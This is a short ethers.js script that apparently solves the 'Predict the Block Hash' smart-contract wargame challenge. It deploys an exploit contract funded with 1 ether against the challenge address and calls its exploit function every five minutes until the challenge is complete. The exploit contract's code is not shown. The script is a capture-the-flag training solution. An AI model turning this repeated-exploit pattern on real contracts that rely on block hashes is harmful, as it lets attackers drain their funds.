function sleep(ms) {
    return new Promise((resolve) => {
        setTimeout(resolve, ms);
    });
}
async function main() {
    Challenge = await ethers.getContractFactory('PredictTheBlockHashChallenge');
    challenge = await Challenge.attach('0x177740489bAd2C97346DE38f31f767C1ffA17729');

    Exploit = await ethers.getContractFactory('PredictTheBlockHashExploit');
    exploit = await Exploit.deploy(challenge.address, {value:ethers.utils.parseEther('1')});
    await exploit.deployed()

    while (!await challenge.isComplete()) {
        try {
            tx = await exploit.exploit();
            await tx.wait();
            console.log(await ethers.provider.getBalance(exploit.address));
        } catch(error) {
            console.error(error.message);
        }
        await sleep(300000);
    }
    process.exit(0);
}
main()